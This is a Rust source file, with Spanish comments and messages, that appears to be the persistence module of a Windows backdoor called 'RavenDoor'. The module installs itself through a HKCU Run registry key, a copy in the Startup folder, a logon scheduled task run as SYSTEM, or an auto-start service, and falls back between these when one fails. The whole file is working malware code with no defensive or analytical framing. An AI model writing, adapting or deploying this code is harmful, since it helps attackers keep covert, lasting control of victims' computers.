use std::process::Command;

pub fn install(method: &str) {
    println!("[*] Instalando persistencia: {}", method);
    
    match method.to_lowercase().as_str() {
        "registry" => install_registry(),
        "startup" => install_startup(),
        "scheduled" => install_scheduled_task(),
        "service" => install_service(),
        _ => {
            println!("[!] Método no reconocido, usando startup");
            install_startup()
        }
    }
}

fn install_registry() {
    let current_exe = match std::env::current_exe() {
        Ok(path) => path.to_string_lossy().to_string(),
        Err(e) => {
            println!("[!] Error obteniendo ejecutable: {}", e);
            return;
        }
    };
    
    // Agregar a HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    let output = Command::new("reg")
        .args(&[
            "add",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            "RavenDoor",
            "/t",
            "REG_SZ",
            "/d",
            &current_exe,
            "/f",
        ])
        .output();
    
    match output {
        Ok(output) if output.status.success() => {
            println!("[+] Persistencia Registry instalada");
        }
        Ok(output) => {
            let error = String::from_utf8_lossy(&output.stderr);
            println!("[!] Error Registry: {}", error);
        }
        Err(e) => println!("[!] Error ejecutando reg: {}", e),
    }
}

fn install_startup() {
    // Usar APPDATA en lugar de dirs::config_dir
    let appdata = match std::env::var("APPDATA") {
        Ok(path) => path,
        Err(_) => {
            println!("[!] No se pudo obtener APPDATA");
            return;
        }
    };
    
    let startup_path = format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", appdata);
    
    let current_exe = match std::env::current_exe() {
        Ok(path) => path.to_string_lossy().to_string(),
        Err(e) => {
            println!("[!] Error obteniendo ejecutable: {}", e);
            return;
        }
    };
    
    // Intentar copiar el ejecutable al startup
    let target_path = format!("{}\\ravendoor.exe", startup_path);
    
    if let Err(e) = std::fs::copy(&current_exe, &target_path) {
        println!("[!] Error copiando archivo: {}", e);
    } else {
        println!("[+] Ejecutable copiado a Startup: {}", target_path);
    }
    
    // También crear entrada en registry por si acaso
    install_registry();
}

fn install_scheduled_task() {
    let current_exe = match std::env::current_exe() {
        Ok(path) => path.to_string_lossy().to_string(),
        Err(e) => {
            println!("[!] Error obteniendo ejecutable: {}", e);
            return;
        }
    };
    
    // Crear tarea programada
    let output = Command::new("schtasks")
        .args(&[
            "/Create",
            "/tn", "RavenDoor",
            "/tr", &current_exe,
            "/sc", "onlogon",
            "/ru", "SYSTEM",
            "/f",
        ])
        .output();
    
    match output {
        Ok(output) if output.status.success() => {
            println!("[+] Tarea programada instalada");
        }
        Ok(output) => {
            let error = String::from_utf8_lossy(&output.stderr);
            println!("[!] Error schtasks: {}", error);
            println!("[*] Intentando con startup...");
            install_startup();
        }
        Err(e) => {
            println!("[!] Error ejecutando schtasks: {}", e);
            install_startup();
        }
    }
}

fn install_service() {
    let current_exe = match std::env::current_exe() {
        Ok(path) => path.to_string_lossy().to_string(),
        Err(e) => {
            println!("[!] Error obteniendo ejecutable: {}", e);
            return;
        }
    };
    
    // Instalar como servicio (requiere sc.exe)
    let output = Command::new("sc")
        .args(&[
            "create",
            "RavenDoorSvc",
            &format!("binPath= \"{}\"", current_exe),
            "start=", "auto",
        ])
        .output();
    
    match output {
        Ok(output) if output.status.success() => {
            println!("[+] Servicio instalado");
            
            // Intentar iniciar el servicio
            let _ = Command::new("sc")
                .args(&["start", "RavenDoorSvc"])
                .output();
        }
        Ok(output) => {
            let error = String::from_utf8_lossy(&output.stderr);
            println!("[!] Error creando servicio: {}", error);
            println!("[*] Intentando con scheduled task...");
            install_scheduled_task();
        }
        Err(e) => {
            println!("[!] Error ejecutando sc: {}", e);
            install_scheduled_task();
        }
    }
}